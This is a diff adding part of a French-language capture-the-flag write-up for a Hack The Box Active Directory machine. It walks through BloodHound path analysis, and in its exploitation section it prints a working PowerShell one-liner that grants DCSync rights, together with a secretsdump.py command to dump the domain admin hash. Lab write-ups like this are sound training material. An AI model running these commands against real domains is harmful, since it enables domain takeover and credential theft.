@@ -87,3 +87,45 @@ Coté box :
 ![Pic11](../img/admirer10.PNG?raw=true) </br>
 
 ## Charger le résultat dans Bloodhound
+On lance neo4j et bloodhound :
+```bash
+$ neo4j console
+$ bloodhound
+```
+</br>
+Maintenant nous importons les données dans bloodhound :</br>
+![Pic12](../img/admirer12.PNG?raw=true) </br>
+Une fois finit, on va faire une recherche pour trouver le chemin le plus court vers l'administrateur du domaine :</br>
+![Pic13](../img/admirer13.PNG?raw=true) </br>
+Nous avons alors un résultat graphique très sympa :</br>
+![Pic14](../img/admirer14.PNG?raw=true) </br>
+Il faut savoir, que sur chaque arête se trouve un élément (Member of / contain / Genericall ..) et si on clique droit sur cet élément
+et que l'on clique sur Help, Bloodhound nous donne un descriptif très complet. Dans notre cas, on a GenericAll et WriteDacl qui, dans l'help, ont une rubrique "Abuse Info" pour 
+expliquer en détail comment epxloiter l'élément.
+
+## Analyser le résultat pour voir l'exploit
+En visualisant le graphique, on peut voir qu'il faudra deux jumps pour accéder à l'Administrateur depuis 
+svc-alfresco. Notre utilisateur étant déjà dans le groupe Privileged IT Account, qui lui même est dans le groupe Account Operators, qui ce dernier,
+si on clique sur le nom de son arête "GenericAll" nous permet de voir que ce groupe a tous les pouvoirs sur Exchange Windows Permissions. Donc il nous faudra ajouter notre compte
+dans le groupe, puis à partir de ce moment là, le groupe Exchange Windows Permissions a les permissions de modifier le DACL (Discretionary Access Control List), donc nous pourrons
+nous donner le privilège DcSync dans le but de dump le hash de l'admin.</br>
+En résumer :
+* On se rajoute dans le groupe Exchange Windows Permissions (via commande powershell).
+* On se donne le privilège DcSync (via commande powershell).
+* On fait un dump du hash admin (via mimikatz ou secretdump.py).
+
+## Exploitation
+L'exploitation doit se faire rapidement, sinon nous perdons les groupes acquis. Donc un One-Liner powershell est fait içi, je reprend simplement les commandes expliquées dans
+bloodhound :
+```bash
+Evil-winRM > Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco;
+ $username = "htb\svc-alfresco"; $password = "s3rvice"; 
+ $secstr = New-Object -TypeName System.Security.SecureString; 
+ $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; 
+ $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; 
+ Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+```
+```bash
+$ secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+```
+![Pic15](../img/admirer15.PNG?raw=true) </br>
